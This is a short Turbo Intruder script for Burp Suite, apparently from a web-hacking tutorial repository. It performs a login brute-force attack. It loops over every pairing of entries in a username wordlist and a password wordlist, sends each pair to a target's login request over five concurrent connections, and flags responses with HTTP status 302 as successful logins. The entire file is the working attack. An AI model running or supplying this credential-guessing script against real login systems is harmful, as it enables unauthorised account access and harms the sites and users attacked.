def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=5,
                            requestsPerConnection=100,
                            pipeline=False
                            )

    # replace path of your file

    for firstWord in open('E:\Github\Web-Hacking-101\Scripts\username.txt'):
        for secondWord in open('E:\Github\Web-Hacking-101\Scripts\password.txt'):
            engine.queue(target.req, [firstWord.rstrip(), secondWord.rstrip()])

def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response

    # if user login successfully, status code will be 302
    if req.status == 302:
        table.add(req)
